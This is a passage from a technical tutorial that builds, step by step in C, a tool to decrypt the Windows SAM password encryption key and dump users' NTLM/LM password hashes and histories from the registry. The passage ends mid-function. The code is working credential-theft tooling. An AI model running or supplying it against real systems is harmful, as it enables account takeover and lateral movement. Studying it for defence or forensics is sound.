	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Password history length: %lu\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordHistoryLength<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// Indicates whether the server is enabled in response to MS-SAMR calls. Ignored in modern implementations</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"DomainServerState: %s\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>DomainServerState <span class="token operator">==</span> DomainServerEnabled <span class="token operator">?</span> L<span class="token string">"Enabled"</span> <span class="token operator">:</span> L<span class="token string">"Disabled"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// Specifies the role of a domain controller in the domain. Irrelevant in modern Active Directory as all domain controllers are functionally equivalent.</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"DomainServerRole: %s\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>DomainServerRole <span class="token operator">==</span> DomainServerRolePrimary <span class="token operator">?</span> L<span class="token string">"Primary"</span> <span class="token operator">:</span> L<span class="token string">"Backup"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// Only relevant for the discontinued Microsoft LAN Manager OS</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"UasCompatibilityRequired: %lu\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>UasCompatibilityRequired<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>The next step is to decrypt the PEK. On older versions of Windows, 
the PEK is encrypted using RC4 with the key being an MD5 hash derived 
from a concatenation of an initialization vector, along with two fixed 
strings and the LSA system key. In Windows 10 version 1607, the cipher 
is changed to AES-128-CBC with the LSA system key taking the place of 
the AES key. Keeping this in mind, let us first create a helper function
 that decrypts data using AES-128. The <code>Aes128Decrypt</code> function uses the WinCrypt API to AES-128 decrypt the specified ciphertext in-place. It has the following parameters:</p>
<ul>
<li>
<p><code>Key</code> - A pointer to a 16-byte key.</p>
</li>
<li>
<p><code>Iv</code> - A pointer to a 16-byte IV.</p>
</li>
<li>
<p><code>Ciphertext</code> - A pointer to the ciphertext which is to be 
decrypted. Since decryption is performed in-place, the size of this 
buffer must be aligned to 16 bytes.</p>
</li>
<li>
<p><code>CiphertextLength</code> - The size of the <code>Ciphertext</code> buffer, in bytes.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOLEAN <span class="token function">Aes128Decrypt</span><span class="token punctuation">(</span>_In_ PUCHAR Key<span class="token punctuation">,</span> _In_ PUCHAR Iv<span class="token punctuation">,</span> _Inout_ PUCHAR Ciphertext<span class="token punctuation">,</span> _Inout_ ULONG CiphertextLength<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	HCRYPTPROV Provider<span class="token punctuation">;</span>
	BOOL       Result <span class="token operator">=</span> <span class="token function">CryptAcquireContextA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Provider<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> PROV_RSA_AES<span class="token punctuation">,</span> CRYPT_VERIFYCONTEXT<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Cannot acquire handle to the AES crypto provider: %lu"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	HCRYPTKEY KeyHandle <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

	<span class="token keyword">do</span>
	<span class="token punctuation">{</span>
		<span class="token comment">//</span>
		<span class="token comment">// The key blob header is followed in memory by the size of the key, in bytes, and the key itself</span>
		<span class="token comment">//</span>

		UCHAR       Buffer<span class="token punctuation">[</span>AES_KEY_BLOB_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
		BLOBHEADER<span class="token operator">*</span> KeyBlob <span class="token operator">=</span> <span class="token punctuation">(</span>BLOBHEADER<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>

		KeyBlob<span class="token operator">-&gt;</span>bType    <span class="token operator">=</span> PLAINTEXTKEYBLOB<span class="token punctuation">;</span>
		KeyBlob<span class="token operator">-&gt;</span>bVersion <span class="token operator">=</span> CUR_BLOB_VERSION<span class="token punctuation">;</span>
		KeyBlob<span class="token operator">-&gt;</span>reserved <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		KeyBlob<span class="token operator">-&gt;</span>aiKeyAlg <span class="token operator">=</span> CALG_AES_128<span class="token punctuation">;</span>

		<span class="token operator">*</span><span class="token punctuation">(</span>PULONG<span class="token punctuation">)</span><span class="token punctuation">(</span>Buffer <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>BLOBHEADER<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> AES_KEY_SIZE<span class="token punctuation">;</span>
		<span class="token function">RtlCopyMemory</span><span class="token punctuation">(</span>Buffer <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>BLOBHEADER<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ULONG<span class="token punctuation">)</span><span class="token punctuation">,</span> Key<span class="token punctuation">,</span> AES_KEY_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

		Result <span class="token operator">=</span> <span class="token function">CryptImportKey</span><span class="token punctuation">(</span>Provider<span class="token punctuation">,</span> Buffer<span class="token punctuation">,</span> AES_KEY_BLOB_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not import the AES key: %lu"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">//</span>
		<span class="token comment">// Set CBC mode</span>
		<span class="token comment">//</span>

		ULONG Mode <span class="token operator">=</span> CRYPT_MODE_CBC<span class="token punctuation">;</span>
		Result     <span class="token operator">=</span> <span class="token function">CryptSetKeyParam</span><span class="token punctuation">(</span>KeyHandle<span class="token punctuation">,</span> KP_MODE<span class="token punctuation">,</span> <span class="token punctuation">(</span>PUCHAR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Mode<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not set the AES mode to CBC: %lu"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">//</span>
		<span class="token comment">// Set the IV</span>
		<span class="token comment">//</span>

		Result <span class="token operator">=</span> <span class="token function">CryptSetKeyParam</span><span class="token punctuation">(</span>KeyHandle<span class="token punctuation">,</span> KP_IV<span class="token punctuation">,</span> Iv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not set the IV: %lu"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">//</span>
		<span class="token comment">// Decrypt the ciphertext</span>
		<span class="token comment">//</span>

		Result <span class="token operator">=</span> <span class="token function">CryptDecrypt</span><span class="token punctuation">(</span>KeyHandle<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> Ciphertext<span class="token punctuation">,</span> <span class="token operator">&amp;</span>CiphertextLength<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not decrypt the ciphertext: %lu"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>KeyHandle <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">CryptDestroyKey</span><span class="token punctuation">(</span>KeyHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>Provider<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> Result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>The <code>DecryptPasswordEncryptionKey</code> function reads the PEK version from the respective domain attribute, specifically <code>DomainFixedData-&gt;PasswordEncryptionKey</code>.
 Depending on the version, a different decryption routine is performed, 
as explained above. If decryption is successful, the PEK is copied into 
the <code>PasswordEncryptionKey</code> buffer.</p>
<ul>
<li>
<p><code>LsaSystemKey</code> - The LSA system key, obtained by calling <code>GetLsaSystemKey</code>.</p>
</li>
<li>
<p><code>DomainFixedData</code> - A pointer to a <code>SAM_DOMAIN_FIXED_DATA</code> containing the fixed attributes of a domain, including the PEK.</p>
</li>
<li>
<p><code>PasswordEncryptionKey</code> - A pointer to a 16-byte buffer that will receive the PEK.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">CHAR String1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"!@#$%^&amp;*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&amp;%"</span><span class="token punctuation">;</span>
CHAR String2<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"0123456789012345678901234567890123456789"</span><span class="token punctuation">;</span>

BOOLEAN <span class="token function">DecryptPasswordEncryptionKey</span><span class="token punctuation">(</span>_In_ PUCHAR LsaSystemKey<span class="token punctuation">,</span> _In_ PSAM_DOMAIN_FIXED_DATA DomainFixedData<span class="token punctuation">,</span> _Out_ PUCHAR PasswordEncryptionKey<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">switch</span> <span class="token punctuation">(</span>DomainFixedData<span class="token operator">-&gt;</span>PasswordEncryptionKey<span class="token punctuation">.</span>Version<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
		<span class="token punctuation">{</span>
			<span class="token comment">//</span>
			<span class="token comment">// Create the RC4 key. Fortunately NTDLL exports MD5 function</span>
			<span class="token comment">//</span>

			MD5_CTX Md5Context<span class="token punctuation">;</span>

			<span class="token function">MD5Init</span>  <span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">MD5Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordEncryptionKey<span class="token punctuation">.</span>Rc4<span class="token punctuation">.</span>Salt<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">MD5Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">,</span> String1<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>String1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">MD5Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">,</span> LsaSystemKey<span class="token punctuation">,</span> SYSTEM_KEY_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">MD5Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">,</span> String2<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>String2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">MD5Final</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">//</span>
			<span class="token comment">// Use SystemFunction033 for RC4 decryption</span>
			<span class="token comment">//</span>

			STRING Data<span class="token punctuation">;</span>
			Data<span class="token punctuation">.</span>Length <span class="token operator">=</span> Data<span class="token punctuation">.</span>MaximumLength <span class="token operator">=</span> PEK_SIZE<span class="token punctuation">;</span>
			Data<span class="token punctuation">.</span>Buffer <span class="token operator">=</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordEncryptionKey<span class="token punctuation">.</span>Rc4<span class="token punctuation">.</span>Key<span class="token punctuation">;</span>

			STRING Key<span class="token punctuation">;</span>
			Key<span class="token punctuation">.</span>Length <span class="token operator">=</span> Key<span class="token punctuation">.</span>MaximumLength <span class="token operator">=</span> MD5_DIGEST_LENGTH<span class="token punctuation">;</span>
			Key<span class="token punctuation">.</span>Buffer <span class="token operator">=</span> Md5Context<span class="token punctuation">.</span>Digest<span class="token punctuation">;</span>

			NTSTATUS Status <span class="token operator">=</span> <span class="token function">SystemFunction033</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Data<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Key<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token function">RtlCopyMemory</span><span class="token punctuation">(</span>PasswordEncryptionKey<span class="token punctuation">,</span> Data<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span> Data<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			
			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Cannot decrypt the PEK: 0x%08lX"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
		<span class="token punctuation">{</span>
			<span class="token comment">//</span>
			<span class="token comment">// Decryption is done in-place so we will copy the decrypted key into the PasswordEncryptionKey buffer</span>
			<span class="token comment">//</span>

			BOOLEAN Result <span class="token operator">=</span> <span class="token function">Aes128Decrypt</span><span class="token punctuation">(</span>LsaSystemKey<span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordEncryptionKey<span class="token punctuation">.</span>Aes<span class="token punctuation">.</span>Iv<span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordEncryptionKey<span class="token punctuation">.</span>Aes<span class="token punctuation">.</span>Key<span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordEncryptionKey<span class="token punctuation">.</span>Aes<span class="token punctuation">.</span>KeyLength<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> TRUE<span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token function">RtlCopyMemory</span><span class="token punctuation">(</span>PasswordEncryptionKey<span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordEncryptionKey<span class="token punctuation">.</span>Aes<span class="token punctuation">.</span>Key<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token keyword">return</span> Result<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">default</span><span class="token operator">:</span>
		<span class="token punctuation">{</span>
			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Invalid PEK version: %lu"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordEncryptionKey<span class="token punctuation">.</span>Version<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Now that we have the PEK, we can decrypt all hashes present on the 
system. For each user in the local domain, there is a subkey of <code>\Registry\Machine\SAM\SAM\Domains\Account\Users</code> named after the user's RID. For example, the <code>Administrator</code> account, which always has a RID of 500, corresponds to the <code>\Registry\Machine\SAM\SAM\Domains\Account\Users\000001F4</code> key.</p>
<p>Alongside the per-user subkeys, exists the <code>Names</code> subkey.
 This key contains an entry for each user in the local domain, with each
 subkey named after the corresponding user. The default value for each 
of these them is set to the user's RID. Following the scenario above, <code>\Registry\Machine\SAM\SAM\Domains\Account\Users\Names\Administrator</code> has a default value of <code>0x1F4</code>.</p>
<h3 id="toc-heading-7">Dumping password hashes</h3>
<p>Equipped with this information, we can form a plan to dump all the password hashes on the system:</p>
<ul>
<li>
<p>We will iterate through all subkeys of <code>\Registry\Machine\SAM\SAM\Domains\Account\Users</code> and query the <code>F</code> value. Much like the domain fixed attributes, the user <em>fixed</em> attributes contain information stored for each user in the local domain.</p>
</li>
<li>
<p>Next, we will query the <code>V</code> value, which contains the <em>Variable</em>
 user attributes. They are "variable" because, unlike the fixed 
attributes, not all of them are present for each local user. The 
variable attributes are prefixed by an <em>attribute index table</em>, describing the length of each attribute and the offset from the end of the table (the <code>Data</code>
 member of the structure) to the data itself. If an attribute is not 
present, its corresponding entry in the attribute table will have <code>Offset</code> and <code>Length</code> set to 0. For example, we can determine if the LM hash is present by checking if <code>LMHash-&gt;Length</code> is not 0.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_ATTRIBUTE_TABLE_ENTRY</span> 
<span class="token punctuation">{</span>
	ULONG Offset<span class="token punctuation">;</span>
	ULONG Length<span class="token punctuation">;</span>
	ULONG Reserved<span class="token punctuation">;</span>
<span class="token punctuation">}</span> ATTRIBUTE_TABLE_ENTRY<span class="token punctuation">,</span> <span class="token operator">*</span> PATTRIBUTE_TABLE_ENTRY<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_SAM_USER_VARIABLE_DATA</span>
<span class="token punctuation">{</span>
	ATTRIBUTE_TABLE_ENTRY Reserved<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY UserName<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY FullName<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY Comment<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY UserComment<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY Reserved2<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY Homedir<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY HomedirConnect<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY ScriptPath<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY ProfilePath<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY Workstations<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY HoursAllowed<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY Reserved3<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY LMHash<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY NTLMHash<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY NTLMHistory<span class="token punctuation">;</span>
	ATTRIBUTE_TABLE_ENTRY LMHistory<span class="token punctuation">;</span>
	UCHAR                 Data<span class="token punctuation">[</span>ANYSIZE_ARRAY<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> SAM_USER_VARIABLE_DATA<span class="token punctuation">,</span> <span class="token operator">*</span> PSAM_USER_VARIABLE_DATA<span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<ul>
<li>Lastly, we will decrypt and print the hashes described by the password related attributes, namely <code>NTLMHash</code>, <code>LMHash</code>, <code>NTLMHistory</code> and <code>LMHistory</code>.</li>
</ul>
<p>The <code>DumpPasswordHashes</code> function encapsulates the logic described above. It will use <code>PrintUserFixedData</code> and <code>PrintUserVariableData</code> to print the fixed respectively variable attributes of each user. The <code>DumpPasswordHashes</code> function has the following parameters:</p>
<ul>
<li>
<p><code>PasswordEncryptionKey</code> - A pointer to the PEK. Needed when decrypting password hashes.</p>
</li>
<li>
<p><code>OpenKeyEx</code> - A function pointer to <code>NtOpenKeyEx</code>. If it is not null, we must use it instead of <code>NtOpenKey</code>.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">UNICODE_STRING VariableAttributesValueName <span class="token operator">=</span> <span class="token function">RTL_CONSTANT_STRING</span><span class="token punctuation">(</span>L<span class="token string">"V"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

VOID <span class="token function">DumpPasswordHashes</span><span class="token punctuation">(</span>_In_ PUCHAR PasswordEncryptionKey<span class="token punctuation">,</span> _In_ <span class="token function">decltype</span><span class="token punctuation">(</span>NtOpenKeyEx<span class="token punctuation">)</span><span class="token operator">*</span> OpenKeyEx<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token comment">//</span>
	<span class="token comment">// Open a handle to the "Users" key</span>
	<span class="token comment">//</span>

	HANDLE			  UsersKey<span class="token punctuation">;</span>
	UNICODE_STRING    KeyName <span class="token operator">=</span> <span class="token function">RTL_CONSTANT_STRING</span><span class="token punctuation">(</span>L<span class="token string">"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	OBJECT_ATTRIBUTES KeyAttributes<span class="token punctuation">;</span>

	<span class="token function">InitializeObjectAttributes</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>KeyAttributes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyName<span class="token punctuation">,</span> OBJ_CASE_INSENSITIVE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

	NTSTATUS Status<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>OpenKeyEx <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		Status <span class="token operator">=</span> <span class="token function">NtOpenKey</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>UsersKey<span class="token punctuation">,</span> KEY_ENUMERATE_SUB_KEYS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyAttributes<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span>
	<span class="token punctuation">{</span>
		Status <span class="token operator">=</span> <span class="token function">OpenKeyEx</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>UsersKey<span class="token punctuation">,</span> KEY_ENUMERATE_SUB_KEYS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyAttributes<span class="token punctuation">,</span> REG_OPTION_BACKUP_RESTORE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open a handle the Users key: 0x%08lX"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// Query the number of subkeys. Subtract one from this value (since we are not counting "Names") and you have the number of users in the local domain</span>
	<span class="token comment">//</span>

	KEY_FULL_INFORMATION KeyInformation<span class="token punctuation">;</span>
	ULONG                ResultLength<span class="token punctuation">;</span>

	Status <span class="token operator">=</span> <span class="token function">NtQueryKey</span><span class="token punctuation">(</span>UsersKey<span class="token punctuation">,</span> KeyFullInformation<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyInformation<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>KEY_FULL_INFORMATION<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ResultLength<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// NtQueryKey may return STATUS_BUFFER_OVERFLOW because it cannot fit the entire key information in the buffer we specified.</span>
	<span class="token comment">// This is fine because we the partial data we receive contains the number of subkeys, which is what we are looking for</span>
	<span class="token comment">//</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Failed querying the number of \"Users\" subkeys: 0x%08lX"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">NtClose</span><span class="token punctuation">(</span>UsersKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	UCHAR                  Buffer<span class="token punctuation">[</span>USER_SUBKEY_INFORMATION_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
	PKEY_BASIC_INFORMATION SubkeyInformation <span class="token operator">=</span> <span class="token punctuation">(</span>PKEY_BASIC_INFORMATION<span class="token punctuation">)</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>

	KeyAttributes<span class="token punctuation">.</span>RootDirectory <span class="token operator">=</span> UsersKey<span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span>ULONG Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> Index <span class="token operator">&lt;</span> KeyInformation<span class="token punctuation">.</span>SubKeys <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> Index<span class="token operator">++</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token comment">//</span>
		<span class="token comment">// NtEnumerateKey queries information about a subkey by its index</span>
		<span class="token comment">//</span>

